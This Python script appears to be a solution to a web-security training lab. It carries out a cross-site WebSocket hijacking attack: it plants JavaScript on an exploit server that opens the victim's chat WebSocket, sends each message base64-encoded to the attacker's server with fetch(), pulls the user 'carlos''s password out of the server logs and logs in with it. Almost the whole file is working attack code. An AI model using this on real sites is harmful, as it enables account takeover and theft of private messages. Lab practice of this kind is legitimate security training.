import requests
import urllib3
from sys import argv 
import time 
import re
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_website_urls():
    if len(argv) != 5:
        print(f"[+] usage {argv[0]} <url> <exploit_server_url> <csrf> <session>")
        print(f"[+] example {argv[0]} 'http://example.com' 'http://exploit.server.com' 'HCV66AQqUaazIJu73gqNQpVpYT0pHN0i' '0pLZaE3YOQ6LW5JvZJm1IXZ7FcgM0SaB'")
        exit(-1)
    if argv[1][-1] == '/':
        url = argv[1][:-1]
    else:
        url = argv[1]
    if argv[2][-1] == '/':
        exlpoit_server = argv[2][:-1]
    else:
        exlpoit_server = argv[2]
    csrf = argv[3]
    session = argv[4]
    return url,exlpoit_server,csrf,session


def extract_pass_from_logs(logs):
    pattern = r'exptoit\?message=(.*)'
    match = re.findall(pattern, logs)
    unique_list = list(set(match))
    for i in unique_list:
        pattern = r'^(.*?) HTTP/1\.1'
        match = re.search(pattern, i)
        decoded_bytes = base64.b64decode(match[0].replace("HTTP/1.1",""))
        decoded_string = decoded_bytes.decode("utf-8")
        if "it's" in decoded_string or "it&apos;s" in decoded_string:
            words = decoded_string.split()
            password = words[5].replace('"}',"")
            print(f"[+] Carlos Password : {password}")
            return password


def exploit():
    url,exlpoit_server,csrf,session = get_website_urls()
    logs_server = exlpoit_server + "/log"
    js_webSocket_code = '<script>\
                            const ws = new WebSocket(\
                            "wss://%s/chat");\
                            ws.onopen = () => {\
                                ws.send("READY");\
                            };\
                            ws.onmessage = (event) => {\
                                fetch("https://%s/exptoit?message=" +\
                                btoa(event.data))\
                            };\
                        </script>' % (url,exlpoit_server)
    params = {
        "urlIsHttps":"on",
        "responseFile":"/exploit",
        "responseHead":"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody":js_webSocket_code,
        "formAction":"DELIVER_TO_VICTIM"
    }
    r = requests.post(exlpoit_server, data=params)
    r2 = requests.get(logs_server)
    passwd = extract_pass_from_logs(r2.text)
    params = {
    "username" : "carlos",
    "password" : passwd,
    "csrf": csrf
    }
    cookie = {"session":session}
    r3 = requests.post(url + "/login", data=params, cookies=cookie)

def check_if_attack_successful():
    url,exlpoit_server,csrf,session = get_website_urls()
    time.sleep(2)
    r = requests.get(url)
    if 'Congratulations' in r.text:
        print("[+] attack successfully")
    else:
        print("[-] attack unsuccessfully")

        
print("[+] Starting attack")
exploit()
check_if_attack_successful()